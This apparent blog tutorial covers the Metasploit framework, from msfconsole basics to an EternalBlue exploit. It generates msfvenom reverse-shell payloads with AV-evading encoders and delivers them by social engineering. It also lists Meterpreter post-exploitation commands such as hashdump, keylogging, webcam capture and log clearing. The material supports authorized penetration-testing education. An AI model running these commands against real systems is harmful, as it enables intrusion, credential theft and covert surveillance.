---

layout: post
title: "Metasploit"
date: 2024-06-25
categories: Exploitation

---

## Table of Contents

1. [Introduction to Metasploit](#introduction-to-metasploit)  
2. [Metasploit Framework](#metasploit-framework)  
   1. [Main Components of the Metasploit Framework](#main-components-of-the-metasploit-framework)  
3. [Using msfconsole](#using-msfconsole)  
   1. [Core Concepts and Examples](#core-concepts-and-examples)  
4. [Working with Modules](#working-with-modules)  
   1. [Entering Module Context](#entering-module-context)  
   2. [Setting Parameters](#setting-parameters)  
   3. [Common Parameters](#common-parameters)  
   4. [Global Parameters](#global-parameters)  
   5. [Clearing Parameters](#clearing-parameters)  
   6. [Running Modules](#running-modules)  
   7. [Sessions](#sessions)  
5. [Direct Exploit vs. Uploading a Payload](#direct-exploit-vs-uploading-a-payload)  
   1. [Direct Exploit](#direct-exploit)  
   2. [Uploading a Payload](#uploading-a-payload)  
   3. [Using Multi/Handler](#using-multi-handler)  
6. [The Metasploit Database](#the-metasploit-database)  
   1. [Setting Up the Database](#setting-up-the-database)  
   2. [Core Concepts](#core-concepts)  
7. [Msfvenom](#msfvenom)  
   1. [Core Concepts](#core-concepts)  
   2. [Basic Usage](#basic-usage)  
   3. [Staged vs. Stageless Payloads](#staged-vs-stageless-payloads)  
   4. [Building and Delivering Payloads](#building-and-delivering-payloads)  
      1. [Generating a Stageless Payload for Linux](#generating-a-stageless-payload-for-linux)  
      2. [Generating a Stageless Payload for Windows](#generating-a-stageless-payload-for-windows)  
      3. [Delivery Methods and Execution](#delivery-methods-and-execution)  
      4. [Encoding and AV Evasion](#encoding-and-av-evasion)  
   5. [Additional Msfvenom Examples](#additional-msfvenom-examples)  
   6. [Important Msfvenom Options](#important-msfvenom-options)  
8. [Meterpreter](#meterpreter)  
   1. [Meterpreter Commands](#meterpreter-commands)  
   2. [Practical Workflow](#practical-workflow)  
9. [Built-in Commands Categories](#built-in-commands-categories)  
10. [Glossary](#glossary)  
11. [Disclaimer](#disclaimer)  

---

## Introduction to Metasploit

Metasploit is a powerful and versatile framework used for penetration testing, security research, and vulnerability assessment. It provides tools to discover, exploit, and validate vulnerabilities in systems, making it an essential asset for security professionals.

---

## Metasploit Framework

The Metasploit Framework is an open-source platform that allows security experts to develop, test, and execute exploit code. It offers a comprehensive suite of tools, including exploit modules, payloads, and auxiliary modules, enabling users to simulate real-world attacks on networks and applications.

### Main Components of the Metasploit Framework

1. **msfconsole**:  
   The main command-line interface of Metasploit. It is the most commonly used interface for accessing and interacting with the Metasploit Framework. Through msfconsole, users can configure and execute exploits, payloads, and auxiliary modules.

2. **Modules**:  
   Metasploit includes various modules that support its operations, such as:

   - **Exploits**: Code that takes advantage of vulnerabilities in systems to gain unauthorized access.  
   - **Payloads**: Code that runs after successful exploitation, providing the attacker with control over the compromised system.  
   - **Auxiliary Modules**: A wide range of additional functionalities, including scanners, fuzzers, and denial-of-service (DoS) tools.  
   - **Encoders**: Tools that encode exploits and payloads to evade signature-based antivirus detection.  
   - **Evasion**: More targeted and sophisticated techniques compared to encoders for bypassing defenses.  
   - **NOPs**: No-operation instructions used to create buffers and align payloads correctly in memory.  
   - **Post**: Modules used in the post-exploitation phase to gather further information, maintain access, or pivot to other systems.

3. **Tools**:  
   Metasploit offers a set of standalone tools, such as **msfvenom** (for generating payloads) and tools for exploit development (e.g., **pattern_create** and **pattern_offset**).

---

## Using msfconsole

To launch msfconsole, use:

```plaintext
msfconsole
```

### Core Concepts and Examples

1. **Running Commands**  
   You can execute basic system commands directly:

   ```plaintext
   msf6 > pwd
   [*] exec: pwd
   /home/user
   ```

   ```plaintext
   msf6 > uname -a
   [*] exec: uname -a
   Linux kernel_version #1 SMP date arch GNU/Linux
   ```

2. **Help Command**  
   View command usage information:

   ```plaintext
   msf6 > help search
   Usage: search [keywords]
   ```

3. **History Command**  

   ```plaintext
   msf6 > history
   1  use exploit/multi/handler
   2  set payload windows/meterpreter/reverse_tcp
   3  set lhost 192.168.1.100
   4  set lport 4444
   5  exploit
   ```

4. **Tab Completion**  
   Pressing **Tab** autocompletes commands, module names, etc.

5. **Context Management**  
   Metasploit settings are typically module-specific. If you switch modules, your set parameters will not carry over unless they are configured as global.

6. **Show Options**  

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
   ```

7. **Back Command**  

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > back
   msf6 >
   ```

8. **Info Command**  

   ```plaintext
   msf6 exploit(unix/ftp/vsftpd_234_backdoor) > info
   ```

9. **Search Command**  

   ```plaintext
   msf6 > search vsftpd
   msf6 > search type:exploit platform:windows
   ```

---

## Working with Modules

### Entering Module Context

```plaintext
use exploit/linux/http/apache_mod_cgi_bash_env_exec
show options
```

### Setting Parameters

```plaintext
set RHOSTS 192.168.1.10
set RPORT 8080
```

### Common Parameters

- **RHOSTS**: Target IP address or range.  
- **RPORT**: Target application port.  
- **PAYLOAD**: Payload to use with the exploit.  
- **LHOST**: Attacking machine IP address.  
- **LPORT**: Port for the reverse shell.

### Global Parameters

Use `setg` to set global values:

```plaintext
setg RHOSTS 192.168.1.10
```

### Clearing Parameters

```plaintext
unset RHOSTS
unset all
```

### Running Modules

```plaintext
exploit
```

To run the module and keep it in the background:

```plaintext
exploit -z
```

### Sessions

```plaintext
sessions
sessions -i 1
```

Background a session:

```plaintext
meterpreter > background
```

---

## Direct Exploit vs. Uploading a Payload

### Direct Exploit

**When to Use:**

- A known vulnerability allows a single-step exploitation process.  
- You can directly deliver a payload through Metasploit modules.  
- Automated exploitation is feasible over the network.

**How to Use:**

```plaintext
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
exploit
```

### Uploading a Payload

**When to Use:**

- Direct exploitation is not viable or reliable.  
- You need social engineering or other methods to deliver and execute files.  
- You aim to bypass detection or network restrictions.

**How to Use:**

1. Generate the payload with **msfvenom**:

   ```plaintext
   msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o reverse_shell.aspx
   ```

2. Upload the payload:

   ```plaintext
   smbclient //10.10.10.10/share -U "" -N
   put reverse_shell.aspx
   ```

3. Set up a listener:

   ```plaintext
   use exploit/multi/handler
   set PAYLOAD windows/x64/meterpreter_reverse_tcp
   set LHOST <ATTACKER_IP>
   set LPORT <PORT>
   exploit
   ```

4. Trigger the payload:

   ```plaintext
   http://10.10.10.10/share/reverse_shell.aspx
   ```

### Using Multi/Handler

**When to Use:**  

- Handling reverse connections for payloads executed independently of Metasploit modules.

**How to Use:**

```plaintext
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter_reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT <PORT>
exploit
```

---

## The Metasploit Database

### Setting Up the Database

```plaintext
msf6 > db_init
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

### Core Concepts

- **Hosts and Services**: Stores information about discovered hosts.  
- **Vulnerabilities**: Tracks vulnerabilities found.  
- **Loot**: Keeps any valuable data or files collected.

---

## Msfvenom

`msfvenom` is a standalone tool that merges the functionalities of **msfpayload** and **msfencode**. It is used to create and optionally encode payloads that can be delivered in various ways to compromise a target system.

### Core Concepts

1. **Payloads**  
   Code that executes on the target machine once the exploit is successful.  
2. **Encoders**  
   Used to obfuscate the payload to evade basic antivirus or detection.  
3. **Formats**  
   The output type of the generated payload (e.g., `exe`, `elf`, `dll`, `aspx`, raw shellcode, etc.).

### Basic Usage

```plaintext
msfvenom -p PAYLOAD OPTIONS -e ENCODER -f FORMAT -o OUTPUT_FILE
```

Common example:

```plaintext
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe
```

---

### Staged vs. Stageless Payloads

- **Staged Payloads**:  
  - Send an initial “stage” (a small loader) to the target.  
  - The loader connects back to fetch and execute the final stage.  
  - Often indicated by multiple segments in the payload name (e.g., `windows/meterpreter/reverse_tcp`).  

- **Stageless Payloads**:  
  - Sent all at once, with no separate loader stage.  
  - Less network overhead and fewer packets than a staged payload.  
  - Names often appear as a single segment (e.g., `windows/meterpreter_reverse_tcp`).  

#### Quick Identification

If you see multiple slashes (e.g., `linux/x86/shell/reverse_tcp`), it’s likely **staged**. If it appears as one segment (e.g., `linux/x64/shell_reverse_tcp`), it’s **stageless**.

---

### Building and Delivering Payloads

When network access is limited or direct exploitation cannot be performed, you can craft a custom payload with `msfvenom` and deliver it through social engineering (e.g., email, removable media, or a link). Once the user (or automated process) executes it, the payload will connect back to your system.

#### Generating a Stageless Payload for Linux

```plaintext
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf > backup.elf
```

- **Payload**: `linux/x64/shell_reverse_tcp`  
- **Format**: ELF  
- **Output File**: `backup.elf`

Example steps:

1. **Transfer** `backup.elf` to the target (via email, a hosted web link, or USB).  
2. **Set execute permissions** on the target:  

   ```plaintext
   chmod +x backup.elf
   ```

3. **Start a listener** on the attacker machine (using `nc` or Metasploit multi/handler).  
4. **Run** the file on the target to initiate a reverse shell.

#### Generating a Stageless Payload for Windows

```plaintext
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe > file.exe
```

- **Payload**: `windows/shell_reverse_tcp`  
- **Format**: EXE  
- **Output File**: `file.exe`

Steps:

1. **Deliver** `file.exe` to the Windows target (through social engineering, etc.).  
2. **Start** a listener on your attacker machine.  
3. **Execute** the `.exe` on the target machine to obtain a reverse shell.

#### Delivery Methods and Execution

- **Email or Chat**: Attach the payload file or share a link.  
- **Web Server Download**: Host the payload on a server and trick the target into downloading and running it.  
- **Removable Media**: Copy it onto a flash drive.  
- **Onsite**: Use physical access to place and execute the payload.

#### Encoding and AV Evasion

Modern antivirus solutions often detect common Metasploit payloads. Consider using **encoders** or **evasion modules**:

- **Encoders**:  

  ```plaintext
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> \
      -e x86/shikata_ga_nai -i 5 -f exe -o encoded_payload.exe
  ```

  - `-e`: Specify encoder  
  - `-i`: Number of iterations

- **Evasion Modules** (e.g., from `evasion/windows`):  

  ```plaintext
  use evasion/windows/applocker_evasion_msbuild
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  ...
  ```

While encoders may bypass simple signature checks, **more sophisticated AV solutions** may still detect your payload. Additional obfuscation, custom packers, or building unique binaries can further reduce detection.

---

### Additional Msfvenom Examples

1. **Generate Raw Shellcode** (C format):

   ```plaintext
   msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f c -o shellcode.c
   ```

2. **Generate a PHP Reverse Shell**:

   ```plaintext
   msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -f raw -o shell.php
   ```

3. **List All Payloads**:

   ```plaintext
   msfvenom -l payloads
   ```

   This will display hundreds of possible payloads (for Windows, Linux, OSX, Android, etc.).

---

### Important Msfvenom Options

Below are some commonly used **msfvenom** options:

| Option              | Description                                                                                     |
|---------------------|-------------------------------------------------------------------------------------------------|
| **-p** <PAYLOAD>    | Specifies the payload to generate (e.g., `windows/meterpreter/reverse_tcp`).                    |
| **-f** <FORMAT>     | Specifies the output format (e.g., `exe`, `elf`, `raw`, `c`, `php`, `asp`, `aspx`).             |
| **-o** <FILENAME>   | Specifies the output file name.                                                                 |
| **LHOST**           | The local host (attacker IP) for reverse connections or the IP to bind to for bind shells.       |
| **LPORT**           | The local port for reverse connections or the port to bind to for bind shells.                  |
| **-e** <ENCODER>    | Use a specific encoder (e.g., `x86/shikata_ga_nai`).                                            |
| **-i** <ITERATIONS> | Number of times to encode the payload.                                                          |
| **-x** <TEMPLATE>   | Use an existing executable file as a template for the new payload.                              |
| **--platform**      | Force the platform of the generated payload (e.g., `win`, `linux`, `java`).                     |
| **-a** <ARCH>       | Specify the architecture (e.g., `x86`, `x64`, `armle`, `mipsle`).                                |
| **--encrypt**,<br>**--encrypt-key**,<br>**--encrypt-iv**  | Apply encryption to the generated payload, if supported.                                |
| **--list-options**      | Lists the requirements for the payload.                                |

---

## Meterpreter

Meterpreter is an advanced and extensible Metasploit payload that offers a wide range of post-exploitation capabilities. It runs in memory and can be extended at runtime, making it stealthier and more powerful than a standard command shell.

### Meterpreter Commands

Categories of Meterpreter commands include:

- **Core Commands** (help, background, sessions)  
- **File System Commands** (ls, cd, upload, download)  
- **Networking Commands** (ifconfig, netstat, portfwd, route)  
- **System Commands** (getuid, getsystem, migrate, ps, shell)  
- **Keylogging and Screenshots** (keyscan_start, screenshot, record_mic, webcam_snap)

Example:

```plaintext
meterpreter > ps
meterpreter > migrate <PROCESS_ID>
meterpreter > getuid
meterpreter > hashdump
```

### Practical Workflow

1. **Get User ID**:  

   ```plaintext
   meterpreter > getuid
   ```

2. **List Processes**:  

   ```plaintext
   meterpreter > ps
   ```

3. **Migrate** to Another Process:  

   ```plaintext
   meterpreter > migrate <PROCESS_ID>
   ```

4. **Dump Password Hashes**:  

   ```plaintext
   meterpreter > hashdump
   ```

5. **Obtain a Shell**:  

   ```plaintext
   meterpreter > shell
   ```

---

## Built-in Commands Categories

1. **Core Commands**  
2. **File System Commands**  
3. **Networking Commands**  
4. **System Commands**  
5. **User Interface Commands**  
6. **Webcam Commands**  
7. **Audio Output Commands**  
8. **Elevate Commands**  
9. **Password Database Commands**  
10. **Timestomp Commands**

---

## Glossary

| Command              | Description                                                                 |
|----------------------|-----------------------------------------------------------------------------|
| **background**       | Backgrounds the current session                                              |
| **exit**             | Terminates the Meterpreter session                                           |
| **help**             | Displays the help menu                                                       |
| **irb**              | Opens an interactive Ruby shell on the current session                       |
| **load**             | Loads one or more Meterpreter extensions                                     |
| **migrate**          | Migrates Meterpreter to another process                                      |
| **run**              | Executes a Meterpreter script or Post module                                 |
| **sessions**         | Switches to another session quickly                                          |
| **cd**, **ls**, **pwd** | Basic file system navigation commands                                     |
| **upload**, **download** | Transfers files to/from the target                                       |
| **ifconfig**, **netstat** | Networking commands to enumerate interfaces and active connections      |
| **portfwd**          | Forwards a local port to a remote service                                    |
| **clearev**          | Clears event logs                                                            |
| **execute**          | Executes a command on the target                                             |
| **getpid**, **getuid** | Shows the process/user context                                             |
| **ps**, **kill**     | Lists or terminates processes                                                |
| **shell**            | Drops to a system command shell                                              |
| **keyscan_start**, **keyscan_stop**, **keyscan_dump** | Starts/stops/dumps keylogger data           |
| **screenshare**, **screenshot** | View or capture the target screen                                 |
| **record_mic**       | Records audio from the target’s microphone                                   |
| **webcam_list**, **webcam_snap**, **webcam_stream** | Interact with the target’s webcam             |
| **getsystem**        | Attempts privilege escalation to SYSTEM                                      |
| **hashdump**         | Dumps the contents of the SAM database (Windows)                             |

---

## Disclaimer

This guide is for **educational and authorized penetration testing** purposes only. Unauthorized access of systems and networks is illegal and unethical. Always ensure you have **explicit permission** to test or perform any type of exploit or intrusion on a network or device. Failure to do so may violate applicable laws and regulations.

---
